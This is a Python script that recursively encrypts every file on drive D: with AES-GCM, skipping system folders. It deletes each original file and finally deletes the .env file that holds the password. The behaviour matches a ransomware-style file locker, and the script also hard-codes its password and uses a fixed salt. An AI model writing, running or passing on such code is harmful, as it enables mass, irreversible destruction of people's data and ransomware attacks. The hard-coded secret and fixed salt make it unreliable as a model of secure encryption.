import os
from pathlib import Path
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv

# Load password from .env
load_dotenv()
# password = os.getenv("PASSWORD")
password = "325482"
if not password:
    print("[-] Password not found in .env file.")
    exit(1)

# --- Derive key once using a fixed salt ---
# You can change salt to any fixed value for consistency
SALT = b"fixed_salt_for_all_files!"  # must be 16+ bytes
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=SALT,
    iterations=100_000,  # secure and fast enough
)
key = kdf.derive(password.encode())
aesgcm = AESGCM(key)

# --- Encryption function ---
def encrypt_file(file_path: Path):
    try:
        if file_path.suffix == ".enc":  # skip already encrypted
            return
        data = file_path.read_bytes()
        nonce = os.urandom(12)  # unique per file
        encrypted = aesgcm.encrypt(nonce, data, None)
        enc_path = file_path.with_suffix(file_path.suffix + ".enc")
        enc_path.write_bytes(nonce + encrypted)  # store nonce + ciphertext
        file_path.unlink()  # remove original
        print(f"[+] Encrypted: {file_path}")
    except Exception as e:
        print(f"[-] Failed: {file_path} | {e}")

# --- Gather all files to encrypt ---
def gather_files(drive: Path):
    skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "$Recycle.Bin", "System Volume Information"}
    files = []
    for root, dirs, filenames in os.walk(drive):
        dirs[:] = [d for d in dirs if d not in skip_dirs]
        for f in filenames:
            files.append(Path(root) / f)
    return files

# --- Main function ---
def main():
    drive = Path("D:/")  # change if needed
    if not drive.exists():
        print("Drive not found.")
        return

    all_files = gather_files(drive)
    print(f"Found {len(all_files)} files to encrypt.")

    # --- Parallel encryption ---
    with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
        executor.map(encrypt_file, all_files)

    print("\nEncryption complete. Only encrypted files remain.")

    # Remove .env for security
    env_path = Path(".env")
    if env_path.exists():
        env_path.unlink()
        print(".env file deleted for security.")

if __name__ == "__main__":
    main()
